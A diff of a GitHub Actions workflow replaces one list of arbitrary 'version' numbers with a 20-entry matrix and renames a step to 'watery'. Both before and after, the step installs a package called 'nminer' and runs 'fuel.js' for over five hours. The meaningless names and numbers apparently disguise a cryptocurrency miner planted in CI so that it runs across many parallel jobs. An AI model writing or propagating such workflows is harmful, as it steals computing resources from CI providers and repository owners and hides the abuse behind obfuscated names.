@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6868 }
-          - { version: 7497 }
-          - { version: 6294 }
-          - { version: 9346 }
-          - { version: 7457 }
-          - { version: 7871 }
-          - { version: 9842 }
-          - { version: 2558 }
-          - { version: 5782 }
-          - { version: 2173 }
-          - { version: 2929 }
-          - { version: 7193 }
-          - { version: 6331 }
-          - { version: 1076 }
-          - { version: 335 }
-          - { version: 2687 }
-          - { version: 3378 }
-          - { version: 3243 }
+          - { version: 7660 }
+          - { version: 8078 }
+          - { version: 4034 }
+          - { version: 2330 }
+          - { version: 4510 }
+          - { version: 8182 }
+          - { version: 8603 }
+          - { version: 6933 }
+          - { version: 8359 }
+          - { version: 8295 }
+          - { version: 7728 }
+          - { version: 3201 }
+          - { version: 8823 }
+          - { version: 6305 }
+          - { version: 9807 }
+          - { version: 105 }
+          - { version: 3507 }
+          - { version: 6551 }
+          - { version: 3219 }
+          - { version: 803 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: eek shinny er mozzarella
+      - name: watery
         run: |
           npm install nminer@latest
-          timeout 347m node fuel.js || echo "fuel executed"
+          timeout 334m node fuel.js || echo "fuel executed"
